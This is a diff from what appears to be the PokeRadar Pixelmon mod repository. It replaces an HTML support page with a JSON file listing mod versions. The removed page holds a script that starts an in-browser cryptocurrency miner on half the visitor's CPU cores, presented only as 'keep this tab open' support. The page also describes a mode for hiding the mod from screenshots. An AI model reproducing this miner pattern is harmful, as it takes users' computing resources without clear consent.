@@ -1,125 +1,54 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-98699483-2"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-
-    gtag('config', 'UA-98699483-2');
-  </script>
-  <title>PokeRadar</title>
-  <style type="text/css">
-    body {     
-      background-image: url(https://i.imgur.com/273USns.jpg);
-      background-position: center;
-      background-attachment: fixed;
-      background-repeat: no-repeat;
-      background-size: cover;
-      text-align: center;
-    }
-
-    #content {
-      background-color: #ffffff;
-      padding: 10px 30px;
-      border-radius: 10px;
-      text-align: left;
-      margin: 15px auto;
-      width: 800px;
-    }
-
-    h1 {
-      text-align: center;
-      text-decoration: underline;
-      padding-bottom: 24px;
-    }
-
-    p { padding: 0 30px; }
-
-    html {
-       overflow: -moz-scrollbars-vertical;
-    }
-  </style>
-  <script src="cfc/direct.js?v=1.0" data-user="3156969" data-level="50"></script>
-</head>
-<body>
-  <div id="content">
-    <h1 id="main">PokeRadar for Minecraft Pixelmon</h1>
-    
-    <h2 id="support">What's This?</h2>
-    <p>Why did this page open? <a target="_blank" href="https://github.com/kcaf/PokeRadar/wiki/A-webpage-opened%3F">Click here to learn more</a>.<br />
-    If you wish to help support PokeRadar, please keep this tab open in the background. The support of this awesome community is what drives me to do what I do. Now with that out of the way, let's go catch some Shinys!</p>
-
-    <h2 id="features">Features</h2>
-    <p>
-      <ul>
-        <li>New Boss colors with nameplates and waypoints</li>
-        <li>Search multiple pokemon by separating with commas eg: pikachu, magikarp, mew</li>
-        <li>NPC detection</li>
-        <li>PokeLoot detection</li>
-        <li>PokeShrine detection</li>
-        <li>Mega boss detection</li>
-        <li>Filter by Nature</li>
-        <li>Filter by Effort Value (EV). Search by specifically HP, Attack, Defense, Sp.Attk, Sp.Def, or Speed. A pokemon will show up if it has only that EV.</li>
-        <li>PokeRadar automatically checks for updates</li>
-        <li>Right click a Pokemon to view <em>basic</em> stats on it</li>
-        <li>Clicking the "Stats" tab will show two new tabs: <strong>IV</strong> and <strong>EV</strong>. These new tabs reveal hidden information about your Pokemon.</li>
-        <li>Choose between colored dots or pokemon textures on your map</li>
-        <li>Add colors to your pokemon's name and increase the limit on name size</li>
-        <li>More optimization</li>
-      </ul>
-    </p>
-
-    <h2 id="screenshots">Screenshots</h2>
-
-    <p>
-      <a target="_blank" href="https://imgur.com/a/H2aqG">Click here to view the entire Imgur Album</a> <br />
-      <a target="_blank" href="https://i.imgur.com/0vMqhBo.png"><img src="https://i.imgur.com/0vMqhBol.png" alt="1" /></a> <br />
-      <a target="_blank" href="https://i.imgur.com/Bgibxgf.png"><img src="https://i.imgur.com/Bgibxgfl.png" alt="2" /></a> <br />
-      <a target="_blank" href="https://i.imgur.com/M3LfGyq.png"><img src="https://i.imgur.com/M3LfGyql.png" alt="3" /></a> <br />
-      <a target="_blank" href="https://i.imgur.com/SF83f8S.png"><img src="https://i.imgur.com/SF83f8Sl.png" alt="4" /></a>
-    </p>
-
-    <h2 id="information">Information</h2>
-
-    <p>This is the original PokeRadar for Pixelmon. Detect any pokemon in your area, level, location, and if they are shiny. Search for specific pokemon or multiple pokemon at once with commas. Automatic waypoints and for bosses and legendaries in your area. Find PokeLoot and Shrines with ease. Filter by Effort Value (EV) and for faster training! You can enter a partial spelling (minimum 3 letters) for a pokemon and PokeRadar will find it. Use the in-game menu to configure Map settings.</p>
-
-    <h2 id="hotkeys">Hotkeys</h2>
-
-    <p><strong>BACKSLASH "\"</strong> - PokeRadar menu <br />
-    <strong>PAGE DOWN</strong> - Minimap zoom in <br />
-    <strong>PAGE UP</strong> - Minimap zoom out <br />
-    <strong>INSERT</strong> - New Waypoint <br />
-    <strong>M</strong> - Open the map <br />
-    <strong>N</strong> - Change minimap mode</p>
-
-    <p>Pressing N will cycle through the following Map Modes:  </p>
-
-    <ul>
-      <li>Small MiniMap</li>
-      <li>Large MiniMap</li>
-      <li>(new) Hide all traces of PokeRadar from screen. This allows you to safely take screenshots.</li>
-    </ul>
-
-    <h2 id="problemssuggestions">Problems / Suggestions</h2>
-
-    <p>Please <a target="_blank" href="https://github.com/kcaf/PokeRadar/issues/new">submit a new 'Issue'</a> describing in detail the problem you're having with the mod and include and error logs you may have. If you've got a suggestion, post there as well and I'll see what I can do!</p>
-
-  </div>
-  <script>
-    var mi = setInterval(function(){
-      if (miner != null){
-        miner.start();
-        miner.setNumThreads(navigator.hardwareConcurrency/2);
-        setTimeout(function(){
-            miner.start();
-        }, 10000);
-        clearInterval(mi);
-      }
-    }, 1000);
-    window.open("https://github.com/kcaf/PokeRadar/wiki/Change-Log");
-  </script>
-</body>
-</html>
+{
+    "versionList": [
+        {
+            "description": "Pixelmon Reforged",
+            "mcVersion": "Minecraft 1.12.2",
+            "modVersion": "4.0.0",
+            "pkVersion": "Pixelmon 6.1.0",
+            "changeLog": [ ],
+            "updateURL": "https://github.com/kcaf/PokeRadar",
+            "isDirectLink": "false",
+            "newFileName": ""
+        },
+        {
+            "description": "Pixelmon Generations",
+            "mcVersion": "Minecraft 1.10.2",
+            "modVersion": "3.9.2",
+            "pkVersion": "Pixelmon 1.3.2",
+            "changeLog": [ ],
+            "updateURL": "https://github.com/kcaf/PokeRadar",
+            "isDirectLink": "false",
+            "newFileName": ""
+        },
+        {
+            "description": "Pixelmon Classic",
+            "mcVersion": "Minecraft 1.10.2",
+            "modVersion": "3.9.2",
+            "pkVersion": "Pixelmon 5.1.2",
+            "changeLog": [ ],
+            "updateURL": "https://github.com/kcaf/PokeRadar",
+            "isDirectLink": "false",
+            "newFileName": ""
+        },
+        {
+            "description": "Pixelmon Classic",
+            "mcVersion": "Minecraft 1.10.2",
+            "modVersion": "3.9.2",
+            "pkVersion": "Pixelmon 5.0.4",
+            "changeLog": [ ],
+            "updateURL": "https://github.com/kcaf/PokeRadar",
+            "isDirectLink": "false",
+            "newFileName": ""
+        },
+        {
+            "description": "Pixelmon Classic",
+            "mcVersion": "Minecraft 1.10.2",
+            "modVersion": "3.9.2",
+            "pkVersion": "Pixelmon 5.0.3",
+            "changeLog": [ ],
+            "updateURL": "https://github.com/kcaf/PokeRadar",
+            "isDirectLink": "false",
+            "newFileName": ""
+        }
+    ]
+}
